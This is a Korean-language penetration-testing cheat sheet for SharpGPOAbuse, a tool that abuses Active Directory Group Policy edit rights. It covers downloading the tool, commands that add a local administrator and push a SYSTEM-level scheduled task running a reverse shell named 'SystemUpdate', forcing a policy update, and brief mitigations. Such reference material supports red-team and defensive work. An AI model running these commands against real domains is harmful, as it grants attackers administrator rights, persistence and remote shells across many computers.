

# SharpGPOAbuse 활용 가이드

`SharpGPOAbuse`는 Active Directory 환경에서 그룹 정책 개체(GPO)의 잘못된 설정을 악용하여 권한 상승 또는 지속성(Persistence)을 확보하는 데 사용되는 C# 도구입니다. GPO 편집 권한을 가진 공격자가 GPO를 수정하여, 해당 GPO가 적용되는 모든 컴퓨터에서 악성 코드를 높은 권한으로 실행할 수 있게 합니다.

---

### **1. 주요 기능**

`SharpGPOAbuse`는 GPO를 통해 다음과 같은 악의적인 작업을 수행할 수 있습니다.

-   **로컬 관리자 추가 (`--AddLocalAdmin`):** GPO가 적용되는 컴퓨터의 로컬 Administrators 그룹에 특정 사용자를 추가합니다.
-   **즉시 실행 작업 추가 (`--AddImmediateTask`):** GPO에 즉시 실행되는 예약 작업을 추가하여, 지정된 명령어를 `SYSTEM` 권한으로 실행합니다.
-   **시작 스크립트 수정 (`--AddStartupScript`):** 컴퓨터 시작 시 실행되는 스크립트를 GPO를 통해 수정합니다.

---

### **2. 다운로드 및 실행**

-   **[GitHub Releases 링크](https://github.com/FSecureLABS/SharpGPOAbuse/releases)**
-   `SharpGPOAbuse.exe`는 .NET Framework 기반의 실행 파일입니다. 타겟 시스템에 .NET Framework가 설치되어 있어야 합니다.

```bash(title="SharpGPOAbuse 다운로드")
wget https://github.com/FSecureLABS/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
```

---

### **3. 공격 시나리오**

#### **시나리오 A: 로컬 관리자 추가 (`--AddLocalAdmin`)**
-   **목표:** GPO가 적용되는 모든 컴퓨터에 특정 사용자를 로컬 관리자로 추가하여 측면 이동(Lateral Movement) 및 권한 상승 기회를 확보합니다.

```powershell(title="로컬 관리자 추가")
# --UserAccount: 로컬 관리자로 추가할 도메인 사용자 계정
# --GPOName: 공격 대상 GPO의 이름 (BloodHound 등에서 확인)
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <domain>\<user> --GPOName "<GPO_Name>"

./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount enterprise-security --GPOName "SECURITY-POL-VN"
```

#### **시나리오 B: 즉시 실행 작업 추가 (`--AddImmediateTask`)**
-   **목표:** GPO를 통해 악성 명령어를 `SYSTEM` 권한으로 즉시 실행하여 리버스 셸 등을 획득합니다.

```powershell(title="즉시 실행 작업 추가")
# --TaskName: 예약 작업의 이름
# --Command: 실행할 명령어 (예: 리버스 셸 페이로드)
./SharpGPOAbuse.exe --AddImmediateTask --TaskName "SystemUpdate" --Command "C:\Temp\revshell.exe" --GPOName "<GPO_Name>"
```

---

### **4. GPO 업데이트 트리거**

GPO 변경 사항은 클라이언트 컴퓨터에 즉시 적용되지 않고, 기본적으로 90~120분마다 업데이트됩니다. 만약 타겟 시스템에 이미 셸이 있다면, 다음 명령어로 GPO 업데이트를 강제하여 공격을 즉시 트리거할 수 있습니다.

```powershell(title="GPO 업데이트 강제 적용")
gpupdate /force
```

---

### **5. 방어 (Mitigation)**

-   **권한 최소화:** GPO 편집 권한은 도메인 관리자(Domain Admins)와 동일한 수준의 민감한 권한으로 취급해야 합니다. `Group Policy Creator Owners` 그룹의 멤버십을 엄격하게 관리하고, 불필요한 계정에 GPO 편집 권한을 부여하지 않습니다.
-   **정기적인 감사:** BloodHound나 PowerShell 스크립트를 사용하여 주기적으로 GPO 권한 설정을 감사하고, 비정상적인 GPO 변경을 모니터링합니다.


---
